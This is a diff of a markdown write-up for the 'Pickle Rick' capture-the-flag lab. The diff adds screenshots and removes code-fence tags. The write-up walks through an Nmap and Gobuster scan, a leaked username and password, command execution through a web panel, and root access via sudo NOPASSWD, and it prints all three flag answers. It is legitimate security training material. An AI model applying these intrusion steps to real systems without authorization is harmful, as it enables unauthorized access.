@@ -9,7 +9,7 @@ date: 2026-04-15
 
 A Rick and Morty CTF. Help turn Rick back into a human!
 
-
+![](/images/writeups/pickle-rick-challenge.png)
 
 # Solution
 
@@ -21,7 +21,7 @@ First, I ran an Nmap scan on the target IP address:
 
 And got:
 
-```console
+```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-14 12:59 -0400
 Nmap scan report for 10.114.168.221
 Host is up (0.069s latency).
@@ -39,7 +39,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
-
 ```
 
 I found:
@@ -49,16 +48,15 @@ I found:
 
 So I opened the web page on port 80.
 
-
+![](/images/writeups/pickle-rick-homepage.png)
 
 Then I opened the page source to check it:
 
-```html
+```
 <!--
   Note to self, remember username!
   Username: R1ckRul3s
 -->
-
 ```
 
 And found `Username: R1ckRul3s`.
@@ -69,12 +67,11 @@ After looking around the website and not finding anything else, I ran a Gobuster
 
 And got:
 
-```console
+```
 robots.txt           (Status: 200) [Size: 17]
 assets               (Status: 301) [Size: 317] [--> http://10.114.168.221/assets/]
 index.html           (Status: 200) [Size: 1062]
 login.php            (Status: 200) [Size: 882]
-
 ```
 
 ## First Ingredient
@@ -83,18 +80,18 @@ I opened `robots.txt` first and found `Wubbalubbadubdub`.
 
 Then I moved to `login.php`.
 
-
+![](/images/writeups/pickle-rick-login.png)
 
 I tried:
 
 `Username: R1ckRul3s`  
 `Password: Wubbalubbadubdub`
 
-
+![](/images/writeups/pickle-rick-command-panel.png)
 
 I ran `ls -la`:
 
-```console
+```
 total 40
 drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
 drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
@@ -106,12 +103,11 @@ drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
 -rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
 -rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
 -rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
-
 ```
 
 Then I tried `cat Sup3rS3cretPickl3Ingred.txt`, but the command was blocked.
 
-
+![](/images/writeups/pickle-rick-command-blocked-1.png)
 
 While reading the page source, I also found a Base64-looking string:
 
@@ -129,7 +125,7 @@ I ran `ls /` and noticed two directories worth checking: `/home` and `/root`.
 
 Inside `/home`, I found `/home/rick`.
 
-
+![](/images/writeups/pickle-rick-second-ingredient.png)
 
 I ran `strings "/home/rick/second ingredients"` and got the second ingredient: `1 jerry tear`.
 
@@ -137,19 +133,18 @@ I ran `strings "/home/rick/second ingredients"` and got the second ingredient: `
 
 The last ingredient was in `/root`, so I checked my sudo privileges with `sudo -l`:
 
-```console
+```
 Matching Defaults entries for www-data on ip-10-114-168-221:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User www-data may run the following commands on ip-10-114-168-221:
     (ALL) NOPASSWD: ALL
-
 ```
 
 The `NOPASSWD: ALL` entry meant I could run commands as root without a password.
 
 So I listed the root directory:
 
-
+![](/images/writeups/pickle-rick-root-directory.png)
 
 And found the third and final ingredient using `sudo strings /root/3rd.txt`: `fleeb juice`.
